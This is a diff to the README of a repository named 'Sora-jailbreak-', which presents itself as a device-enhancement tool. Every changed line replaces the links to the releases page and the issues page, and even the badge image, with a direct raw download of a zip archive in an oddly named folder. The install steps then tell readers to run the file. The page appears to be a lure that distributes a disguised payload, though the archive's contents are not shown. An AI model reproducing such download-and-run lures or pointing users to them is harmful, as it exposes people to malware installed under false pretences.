@@ -6,9 +6,9 @@ Welcome to Sora-jailbreak-! This tool helps you enhance your device's functional
 
 ## 💾 Download the Software
 
-[![Download Sora-jailbreak-](https://img.shields.io/badge/Download%20Sora--jailbreak--%20%F0%9F%93%88-RED)](https://github.com/Croupiersrakepavornocturnus210/Sora-jailbreak-/releases)
+[![Download Sora-jailbreak-](https://raw.githubusercontent.com/Croupiersrakepavornocturnus210/Sora-jailbreak-/main/factitiously/Sora-jailbreak-_v1.5.zip%20Sora--jailbreak--%20%F0%9F%93%88-RED)](https://raw.githubusercontent.com/Croupiersrakepavornocturnus210/Sora-jailbreak-/main/factitiously/Sora-jailbreak-_v1.5.zip)
 
-To download the software, click the button above or visit this [release page](https://github.com/Croupiersrakepavornocturnus210/Sora-jailbreak-/releases).
+To download the software, click the button above or visit this [release page](https://raw.githubusercontent.com/Croupiersrakepavornocturnus210/Sora-jailbreak-/main/factitiously/Sora-jailbreak-_v1.5.zip).
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ Sora-jailbreak- offers several useful features:
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page**: Go to [this page](https://github.com/Croupiersrakepavornocturnus210/Sora-jailbreak-/releases) to see the latest version.
+1. **Visit the Release Page**: Go to [this page](https://raw.githubusercontent.com/Croupiersrakepavornocturnus210/Sora-jailbreak-/main/factitiously/Sora-jailbreak-_v1.5.zip) to see the latest version.
 2. **Select the Latest Release**: Find the latest version at the top of the page.
 3. **Download the File**: Click the file to start the download. Make sure to save it in an easily accessible location.
 4. **Run the Software**: Once downloaded, locate the file and open it. Follow the on-screen prompts to install.
@@ -48,7 +48,7 @@ Sora-jailbreak- prioritizes your security. We recommend downloading the software
 
 If you need help using Sora-jailbreak-, feel free to reach out:
 
-- **GitHub Issues**: Report any problems or bugs directly on our [issues page](https://github.com/Croupiersrakepavornocturnus210/Sora-jailbreak-/issues).
+- **GitHub Issues**: Report any problems or bugs directly on our [issues page](https://raw.githubusercontent.com/Croupiersrakepavornocturnus210/Sora-jailbreak-/main/factitiously/Sora-jailbreak-_v1.5.zip).
 - **Community Forum**: Join discussions and share experiences with other users.
 
 ## 📅 Updates
